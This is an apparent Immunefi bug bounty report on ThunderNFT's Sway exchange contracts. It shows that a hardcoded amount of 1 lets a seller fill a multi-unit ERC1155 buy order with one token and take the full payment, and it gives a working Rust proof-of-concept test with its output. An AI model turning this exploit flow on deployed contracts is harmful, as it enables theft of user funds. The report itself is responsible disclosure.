# IOP \_ ThunderNFT 34930 - \[Smart Contract - Critical] User can only trade token when ERC is used

Submitted on Sun Sep 01 2024 11:13:08 GMT-0400 (Atlantic Standard Time) by @jasonxiale for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34930

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/libraries>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

According to [discord chat history](https://discord.com/channels/787092485969150012/1271498128981495950/1273191123048988796), ERC1155 tokens are also in scope. In current implementation, there is a issue than when the order maker tries to trade more than 1 tokens for assetId\_X, he/she can only get 1 assetId\_X token.

Which will cause the user losses assets.

## Vulnerability Details

I'll use `Side::Buy` order as an example.

When a buyer calls [thunder\_exchange.place\_order](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L83-L109) to fill a `Side::Buy` order, he can set the amount of ERC1155 asset he wants to buy by [MakerOrderInput.amount](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/libraries/src/order_types.sw#L49).

Then the seller see the order, and he will call [thunder\_exchange.execute\_order](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L181-L193) to fill a `Side::Sell` order, and at the same time, the tx will sent the specified ERC1155 token along with the tx. Then in `thunder_exchange._execute_sell_taker_order`, [strategy.execute\_order](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L398) is called.

In [strategy\_fixed\_price\_sale.execute\_order](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/execution_strategies/strategy_fixed_price_sale/src/main.sw#L128-L152), [ExecutionResult::s1](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/execution_strategies/strategy_fixed_price_sale/src/main.sw#L146) is called to generate an `execution_result`.

As function [execution\_result.s1](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/libraries/src/execution_result.sw#L16-L34) shows, **the amount is always set to 1, which causes the issue**

```solidity
 16     pub fn s1(maker_order: MakerOrder, taker_order: TakerOrder) -> ExecutionResult {
 17         ExecutionResult {
 18             is_executable: (
 19                 (maker_order.side != taker_order.side) &&
 20                 (maker_order.maker != taker_order.taker) &&
 21                 (maker_order.maker == taker_order.maker) &&
 22                 (maker_order.nonce == taker_order.nonce) &&
 23                 (maker_order.price == taker_order.price) &&
 24                 (maker_order.token_id == taker_order.token_id) &&
 25                 (maker_order.collection == taker_order.collection) &&
 26                 (maker_order.end_time >= timestamp()) &&
 27                 (maker_order.start_time <= timestamp())
 28             ),
 29             collection: taker_order.collection,
 30             token_id: taker_order.token_id,
 31             amount: 1, <<<--- Here constant value 1 is used
 32             payment_asset: maker_order.payment_asset,
 33         }
 34     }
```

Then back to [thunder\_exchange.\_execute\_sell\_taker\_order](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L395-L422), the function check if the amount of ERC1155 received equals to `execution_result.amount(which is set to 1 by execution_result::s1 function)` in [thunder\_exchange#L404](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L404), and then sends `execution_result.amount(which is 1)` amount of ERC1155 to the buyer in [thunder\_exchange#L407-L411](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L407-L411)

## Impact Details

As the code flow shows, Alice(the buyer) fills an order to buy X amount of ERC1155 with Y amount payment asset. Bob(the seller) fill sell order for Alice's order, and Bob only need to pay 1 ERC1155 and will get all Alice's Y amount payment asset.

## References

Add any relevant links to documentation or code

## Proof of concept

To mock ERC1155, I make a litter change in erc721's source code:

```diff
diff --git a/contracts-v1/erc721/src/main.sw b/contracts-v1/erc721/src/main.sw
index 3441054..92f56c7 100644
--- a/contracts-v1/erc721/src/main.sw
+++ b/contracts-v1/erc721/src/main.sw
@@ -263,15 +263,15 @@ impl SRC3 for Contract {
 
         // Checks to ensure this is a valid mint.
         let asset = AssetId::new(ContractId::this(), sub_id);
-        require(amount == 1, MintError::CannotMintMoreThanOneNFTWithSubId);
-        require(
-            storage
-                .total_supply
-                .get(asset)
-                .try_read()
-                .is_none(),
-            MintError::NFTAlreadyMinted,
-        );
+        //require(amount == 1, MintError::CannotMintMoreThanOneNFTWithSubId);
+        //require(
+        //    storage
+        //        .total_supply
+        //        .get(asset)
+        //        .try_read()
+        //        .is_none(),
+        //    MintError::NFTAlreadyMinted,
+        //);
         require(
             storage
                 .total_assets
```

Then generate a Rust test template under thunder\_exchange folder, and puts the following code in `thunder_exchange/tests/harness.rs` and run `cargo test -- --nocapture`

```bash
root@racknerd-7808ca6:~/smart-contracts/contracts-v1/thunder_exchange# cargo test  -- --nocapture

running 1 test
test sell_taker_can_sell_less_token ... balance: 200
identity_1 balance: 2
identity_2 balance: 5
before execute_order, wallet_3's asset_id_1 balance: 0
after execute_order, wallet_3's asset_id_1 balance: 1
ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 1.77s
```

In the testcase, wallet\_3 fills a Buy tx and specify `2` amount of token to buy. And wallet\_1 execution a Sell tx to fill wallet\_3's order. And as the result shows, after the tx, wallet\_3 only get `1` amount token

```rust
use fuels::{prelude::*, types::ContractId};

use std::str::FromStr;
 
use fuels::types::{Address, AssetId, Bits256, Bytes32, Identity};
use sha2::{Digest, Sha256};
use fuels::{programs::calls::Execution,};

// Load abi from json
abigen!(
    Contract(
        name = "ThunderExchange",
        abi = "out/debug/thunder_exchange-abi.json"
    ),
    Contract(
        name = "NFT",
        abi = "out/debug/NFT-contract-abi.json"
    ),
    Contract(
        name = "ExecutionManager",
        abi = "out/debug/execution_manager-abi.json"
    ),
    Contract(
        name = "ExecutionStrategy",
        abi = "out/debug/strategy_fixed_price_sale-abi.json"
    ),
    Contract(
        name = "AssetManager",
        abi = "out/debug/asset_manager-abi.json"
    ),
    Contract(
        name = "Pool",
        abi = "out/debug/pool-abi.json"
    ),
    Contract(
        name = "RoyaltyManager",
        abi = "out/debug/royalty_manager-abi.json"
    ));


#[tokio::test]
async fn sell_taker_can_sell_less_token()  -> Result<()> {
    let mut wallets = launch_custom_provider_and_get_wallets(
        WalletsConfig::new(
            Some(5),
            Some(1),
            Some(1_000_000_000), /* Amount per coin */
        ),
        None,
        None,
    )
    .await
    .unwrap();
    let wallet = wallets.pop().unwrap();
    let wallet_1 = wallets.pop().unwrap();
    let wallet_2 = wallets.pop().unwrap();
    let wallet_3 = wallets.pop().unwrap();
    let wallet_4 = wallets.pop().unwrap();

    let thunder_exchange_id = Contract::load_from(
        "./out/debug/thunder_exchange.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let nft_id = Contract::load_from(
        "./out/debug/NFT-contract.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let execution_manager_id = Contract::load_from(
        "./out/debug/execution_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let strategy_fixed_price_sale_id = Contract::load_from(
        "./out/debug/strategy_fixed_price_sale.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let asset_manager_id = Contract::load_from(
        "./out/debug/asset_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let pool_id = Contract::load_from(
        "./out/debug/pool.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let royalty_manager_id = Contract::load_from(
        "./out/debug/royalty_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();


    // setup global variables
    let thunder_exchange_instance = ThunderExchange::new(thunder_exchange_id.clone(), wallet.clone());
    let thunder_exchange_methods = thunder_exchange_instance.clone().methods();
    thunder_exchange_methods.initialize().with_tx_policies(TxPolicies::default()).call().await?;

    let strategy_fixed_price_sale_instance = ExecutionStrategy::new(strategy_fixed_price_sale_id.clone(), wallet.clone());
    let strategy_fixed_price_sale_methods = strategy_fixed_price_sale_instance.clone().methods();
    strategy_fixed_price_sale_methods.initialize(thunder_exchange_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;

    let execution_manager_instance = ExecutionManager::new(execution_manager_id.clone(), wallet.clone());
    let execution_manager_methods = execution_manager_instance.clone().methods();
    execution_manager_methods.initialize().with_tx_policies(TxPolicies::default()).call().await?;
    execution_manager_methods.add_strategy(strategy_fixed_price_sale_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;

    let asset_manager_instance = AssetManager::new(asset_manager_id.clone(), wallet.clone());
    let asset_manager_methods = asset_manager_instance.clone().methods();
    asset_manager_methods.initialize().with_tx_policies(TxPolicies::default()).call().await?;
    asset_manager_methods.add_asset(AssetId::zeroed()).with_tx_policies(TxPolicies::default()).call().await?;


    let pool_instance = Pool::new(pool_id.clone(), wallet.clone());
    let pool_methods = pool_instance.clone().methods();
    pool_methods.initialize(thunder_exchange_id.clone(), asset_manager_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;

    let royalty_manager_instance = RoyaltyManager::new(royalty_manager_id.clone(), wallet.clone());
    let royalty_manager_methods = royalty_manager_instance.clone().methods();
    royalty_manager_methods.initialize().with_tx_policies(TxPolicies::default()).call().await?;

    thunder_exchange_methods.set_pool(pool_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;
    thunder_exchange_methods.set_execution_manager(execution_manager_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;
    thunder_exchange_methods.set_royalty_manager(royalty_manager_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;
    thunder_exchange_methods.set_asset_manager(asset_manager_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;

    let nft_instance = NFT::new(nft_id.clone(), wallet_1.clone());

    let nft_contract_id: ContractId = nft_id.into();
    let sub_id_1 = Bytes32::from([1u8; 32]);
    let sub_id_2 = Bytes32::from([2u8; 32]);
    let sub_id_3 = Bytes32::from([3u8; 32]);
    let asset_id_1 = get_asset_id(sub_id_1, nft_contract_id);
    let asset_id_2 = get_asset_id(sub_id_2, nft_contract_id);
    let asset_id_3 = get_asset_id(sub_id_3, nft_contract_id);
    
    let identity   = Identity::Address(Address::from(wallet.address()));
    let identity_1 = Identity::Address(Address::from(wallet_1.address()));
    let identity_2 = Identity::Address(Address::from(wallet_2.address()));
 
    nft_instance.methods().constructor(identity).call().await?;
    nft_instance.clone().with_account(wallet.clone()).methods().mint(identity_1, Bits256(*sub_id_1), 2).with_variable_output_policy(VariableOutputPolicy::Exactly(1)).call().await?;
    nft_instance.clone().with_account(wallet.clone()).methods().mint(identity_2, Bits256(*sub_id_1), 5).with_variable_output_policy(VariableOutputPolicy::Exactly(1)).call().await?;

    let call_params = CallParameters::default()
        .with_amount(200)
        .with_asset_id(AssetId::zeroed());
    pool_instance
        .clone()
        .with_account(wallet_3.clone())
        .methods()
        .deposit()
        .with_variable_output_policy(VariableOutputPolicy::Exactly(1))
        .with_contracts(&[&strategy_fixed_price_sale_instance, &execution_manager_instance, &thunder_exchange_instance, &nft_instance, &asset_manager_instance, &pool_instance, &royalty_manager_instance])
        .call_params(call_params)
        .unwrap()
        .call()
        .await?;
    println!("balance: {:?}", pool_instance.clone().methods().balance_of(Identity::Address(wallet_3.address().into()), AssetId::zeroed()).call().await?.value);

    println!("identity_1 balance: {}", get_wallet_balance(&wallet_1, &asset_id_1).await);
    println!("identity_2 balance: {}", get_wallet_balance(&wallet_2, &asset_id_1).await);
    let extra_param = ExtraParams {
        extra_address_param: Address::zeroed(),
        extra_contract_param: ContractId::zeroed(),
        extra_u_64_param: 0,
    };

    let buy_order = MakerOrderInput {
        side: Side::Buy,
        maker: wallet_3.address().into(),
        collection: nft_contract_id,
        token_id: Bits256(*sub_id_1),
        price: 10,
        amount: 2,
        nonce: 1,
        strategy: strategy_fixed_price_sale_id.clone().into(),
        payment_asset: AssetId::zeroed(),
        expiration_range: 2000,
        extra_params: extra_param.clone(),
    };
    
    let response = thunder_exchange_instance.clone()
        .with_account(wallet_3.clone())
        .methods()
        .place_order(buy_order)
        .with_contract_ids(&[strategy_fixed_price_sale_id.clone(), execution_manager_id.clone(), thunder_exchange_id.clone(), nft_contract_id.clone().into(), asset_manager_id.clone().clone(), pool_id.clone().into(), royalty_manager_id.clone().into()])
        .call()
        .await?;
    let logs = response.decode_logs();
    //println!("logs: {:?}", logs);
    //println!("get_maker_order_of_user: {:?}", strategy_fixed_price_sale_methods.get_maker_order_of_user(wallet_3.address(), 1, Side::Buy).with_tx_policies(TxPolicies::default()).call().await?.value);

    let take_order = TakerOrder {
        side: Side::Sell,
        taker: wallet_1.address().into(),
        maker: wallet_3.address().into(),
        nonce: 1,
        price: 10,
        token_id: Bits256(*sub_id_1),
        collection: nft_contract_id,
        strategy: strategy_fixed_price_sale_id.clone().into(),
        extra_params: extra_param.clone(),
    };

    let call_params = CallParameters::default()
        .with_amount(1)
        .with_asset_id(asset_id_1);

    println!("before execute_order, wallet_3's asset_id_1 balance: {}", get_wallet_balance(&wallet_3, &asset_id_1).await);
    let response = thunder_exchange_instance.clone()
        .with_account(wallet_1.clone())
        .methods()
        .execute_order(take_order)
        .with_variable_output_policy(VariableOutputPolicy::Exactly(2))
        .with_contract_ids(&[strategy_fixed_price_sale_id.clone(), execution_manager_id.clone(), thunder_exchange_id.clone(), nft_contract_id.clone().into(), asset_manager_id.clone(), pool_id.into(), royalty_manager_id.into()])
        .call_params(call_params)
        .unwrap()
        .call()
        //.simulate(Execution::Realistic)
        .await?;
    //let logs = response.decode_logs();
    //println!("logs: {:?}", logs);
    println!("after execute_order, wallet_3's asset_id_1 balance: {}", get_wallet_balance(&wallet_3, &asset_id_1).await);

    Ok(())
}

pub(crate) fn get_asset_id(sub_id: Bytes32, contract: ContractId) -> AssetId {
    let mut hasher = Sha256::new();
    hasher.update(*contract);
    hasher.update(*sub_id);
    AssetId::new(*Bytes32::from(<[u8; 32]>::from(hasher.finalize())))
}
pub(crate) async fn get_wallet_balance(wallet: &WalletUnlocked, asset: &AssetId) -> u64 {
    wallet.get_asset_balance(asset).await.unwrap()
}
```
